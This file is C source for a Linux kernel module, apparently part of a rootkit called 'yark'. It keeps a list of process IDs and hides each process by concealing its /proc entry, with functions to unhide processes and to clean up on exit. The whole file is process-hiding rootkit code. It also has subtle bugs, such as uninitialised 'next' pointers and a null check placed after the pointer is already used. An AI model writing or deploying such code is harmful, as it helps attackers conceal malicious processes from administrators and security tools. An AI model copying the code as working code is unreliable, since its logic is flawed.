#include <linux/types.h>
#include <linux/slab.h>

#include "hide_proc.h"
#include "hide_file.h"
#include "main.h"

static struct hide_proc_info *hide_proc_info_list_head;
static struct hide_proc_info *hide_proc_info_list_tail;

struct hide_proc_info *get_hide_proc_info_list_head(void){
    return hide_proc_info_list_head;
}

int hide_proc_init(void){
    pr_info(LOG_PREFIX "call hide_proc_init()\n");
    hide_proc_info_list_head = NULL;
    hide_proc_info_list_tail = NULL;
    hide_proc_info_list_head = (struct hide_proc_info *)kmalloc(sizeof(struct hide_proc_info), GFP_KERNEL);
    if (!hide_proc_info_list_head)
        return -ENOMEM;
    hide_proc_info_list_head->pid = -1;
    hide_proc_info_list_tail = hide_proc_info_list_head;
    return 0;
}

int hide_proc_add(pid_t pid){
    struct hide_proc_info *hide_proc_info_list_node,*tmp;
    char buf[20];
    scnprintf(buf, 20, "/proc/%d", pid);
    /* check if the proc is already hidden */
    tmp = hide_proc_info_list_head->next;
    while (tmp != NULL)
    {
        if(tmp->pid == pid){
            pr_info(LOG_PREFIX "pid %d is ALREADY hidden!\n",pid);
            return -ENOMEM;
        }
        tmp = tmp->next;
    }
    
    if (hide_file_add(buf))
        return -ENOMEM;
    hide_proc_info_list_node = (struct hide_proc_info *)kmalloc(sizeof(struct hide_proc_info), GFP_KERNEL);
    hide_proc_info_list_node->pid = pid;
    if (!hide_proc_info_list_node)
        return -ENOMEM;
    hide_proc_info_list_tail->next = hide_proc_info_list_node;
    hide_proc_info_list_tail = hide_proc_info_list_tail->next;
    pr_info(LOG_PREFIX "pid %d is hidden!\n",pid);
    return 0;
}


int hide_proc_del(pid_t pid){
    struct hide_proc_info *node,*tmp;
    char buf[20];
    node = hide_proc_info_list_head;
    while (node->next != NULL && node->next->pid != pid)
    {
        node = node->next;
    }
    if (node->next == NULL){
        pr_info(LOG_PREFIX "no pid %d to del...\n",pid);
        return -ENOMEM;
    }
    scnprintf(buf, 20, "/proc/%d", pid);
    if (hide_file_del(buf))
        return -ENOMEM;
    if (node->next == hide_proc_info_list_tail){
        hide_proc_info_list_tail = node;
    }
    tmp = node->next;
    node->next = node->next->next;
    kfree(tmp);
    pr_info(LOG_PREFIX "pid %d is unhidden!\n",pid);
    return 0;
}

int hide_proc_exit(void){
    pr_info(LOG_PREFIX "call hide_proc_exit()\n");
    while (hide_proc_info_list_head != NULL)
    {
        struct hide_proc_info *tmp;
        tmp = hide_proc_info_list_head;
        hide_proc_info_list_head = hide_proc_info_list_head->next;
        if(tmp->pid != -1)
            pr_info(LOG_PREFIX "pid %d is auto unhidden when yark exit...\n",tmp->pid);
        kfree(tmp);
    }
    hide_proc_info_list_tail = hide_proc_info_list_head = NULL;
    return 0;
}